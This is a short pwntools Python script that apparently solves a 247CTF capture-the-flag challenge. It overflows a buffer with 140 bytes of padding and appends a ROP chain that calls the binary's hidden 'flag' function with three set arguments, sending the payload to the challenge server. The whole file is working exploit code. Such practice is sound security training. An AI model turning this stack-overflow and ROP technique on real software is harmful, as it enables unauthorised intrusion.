#!/usr/bin/python3
from pwn import *
e = ELF('hidden_flag_function_with_args')
r = ROP(e)
def start():
	if args.GDB:
		context.terminal = ['tmux', 'splitw', "-h"]
		return gdb.debug(e.path)
	else:
		return remote('54550e0336fbccae.247ctf.com', 50026)

if __name__=='__main__':
	p = start()
	r.call(e.sym['flag'], [0x1337,  0x247, 0x12345678])
	p.sendline(b'a'*140+r.chain())
	p.interactive()
